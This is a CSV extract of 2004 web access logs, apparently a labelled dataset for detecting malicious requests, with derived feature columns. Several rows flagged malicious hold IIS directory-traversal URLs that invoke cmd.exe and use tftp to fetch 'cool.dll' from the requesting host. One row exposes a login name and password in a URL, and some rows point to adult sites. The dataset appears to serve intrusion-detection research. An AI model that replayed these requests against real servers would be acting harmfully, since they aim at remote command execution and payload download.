,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
87,68.48.142.117,09/Mar/2004:22:35:31 -0500,/MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll ,200,566,"""-""",-,m,1,/MSADC/root.exe,0,without browser
88,68.48.142.117,09/Mar/2004:22:35:31 -0500,/MSADC/httpodbc.dll ,400,286,"""-""",-,n,0,/MSADC/httpodbc.dll,0,without browser
89,68.48.142.117,09/Mar/2004:22:35:36 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
90,24.168.72.174,09/Mar/2004:22:35:48 -0500,http://sbc2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=exodus_!!!!!!!!&passwd=HELL ,200,566,"""-""",-,n,0,/config/login,8,without browser
91,217.229.136.208,09/Mar/2004:22:35:55 -0500,http://217.229.136.208/members/sex/fuck/id000047id/lund4050lundxxx.html ,400,0,"""-""",-,n,0,/members/sex/fuck/id000047id/lund4050lundxxx.html,0,without browser
92,217.136.205.206,09/Mar/2004:22:36:02 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://www.clubsandy.com/""",Mozilla/4.73 ( compatible; MSIE 5.01; Windows NT4.0; DigiExt ),n,0,/secure/pages/index.php,0,Microsoft Internet Explorer
93,217.229.136.208,09/Mar/2004:22:36:02 -0500,217.229.136.208:80 ,200,0,"""-""",-,n,0,217.229.136.208:80,0,without browser
94,217.136.205.206,09/Mar/2004:22:36:07 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://www.clubsandy.com/""",Mozilla/5.0 ( compatible; [en]; Windows 98; NetCaptor ),n,0,/secure/pages/index.php,0,without browser
95,217.136.205.206,09/Mar/2004:22:36:11 -0500,http://members.asstraffic.com/secure/pages/index.php ,200,566,"""http://www.clubsandy.com/""",Mozilla/5.0 ( compatible; [dk]; Windows 98; DigiExt ),n,0,/secure/pages/index.php,0,without browser
96,68.48.142.117,09/Mar/2004:22:36:21 -0500,/c/winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
97,68.48.142.117,09/Mar/2004:22:36:26 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
98,68.48.142.117,09/Mar/2004:22:37:11 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
99,68.48.142.117,09/Mar/2004:22:37:17 -0500,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
100,192.117.242.67,09/Mar/2004:22:37:29 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
101,203.61.199.15,09/Mar/2004:22:37:46 -0500,http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi ,200,2030,"""-""",Mozilla/3.0 (compatible),n,0,/trino/ProxyJ/prxjdg.cgi,0,without browser
102,68.48.142.117,09/Mar/2004:22:38:04 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
103,68.48.142.117,09/Mar/2004:22:38:09 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
104,24.130.219.48,09/Mar/2004:22:38:23 -0500,http://members.meganqt.com/ ,200,0,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/,0,without browser
105,220.173.17.142,09/Mar/2004:22:38:47 -0500,http://www.clickcheaper.com/search.php ,200,17320,"""http://www.163.net""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,0,Microsoft Internet Explorer
106,203.121.182.189,09/Mar/2004:22:38:48 -0500,69.56.234.22:25 ,200,0,"""-""",-,n,0,69.56.234.22:25,0,without browser
107,220.173.17.142,09/Mar/2004:22:38:52 -0500,http://clickcheaper.com/go.php?b=znhzzxzyzxznznhz&k=acassismanapaiscapaxsn&u=sfasasapsdsksv&l=acassismanapaiscapaxsnfizkhosndnfodssszvznhnamshhdzxzmzxzhazsdaxaisxadsdsyafsdavszsmszakakafsvavafdfdkdvaaasfmzkhiahhyhaakazsfzdzszshohnzhhfzffizzhoaxafzmzozdzmzhzihfchcmcphhfkzvhnsnafhahnhkhyhxzozmhdhhdvzdzxszsmshfmhhzaszaoszsohdsoasdhdodoaaansfsosyaohvxmapsdhoavsvhnacaasassaxaiavssznskaxahdhzyhnfmhcxnaacmzaaiaoapsihvhsadzmhizvhosmzdhzhpsfhzapsoshzvhyhchszkhxziafhhhzfifkcizvsisnzmzyzvhpavavzvakzyzmavhvavscszzkaksoaczshczsavszakzcamakddxvdzaisosnamzzsfafzmhfznsasvsssxscspaasisozsazzdshakadhvhczyzkzhsmccdiffsphvaisyssafzczphfzzzsadaxzmaihxamsaadadhvssacafszsyzvsxaysnzpdpdofaafaisnhdadskzdsxsxaizzaiaksd&s=axsssismazfp&t= ,300,0,"""http://www.clickcheaper.com/search.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/go.php,6,Microsoft Internet Explorer
108,68.48.142.117,09/Mar/2004:22:38:55 -0500,/c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/c/winnt/system32/cmd.exe,0,without browser
109,68.48.142.117,09/Mar/2004:22:38:55 -0500,/c/httpodbc.dll ,400,282,"""-""",-,n,0,/c/httpodbc.dll,0,without browser
110,61.172.244.109,09/Mar/2004:22:38:56 -0500,200.91.211.4:25 ,500,430,"""-""",-,n,0,200.91.211.4:25,0,without browser
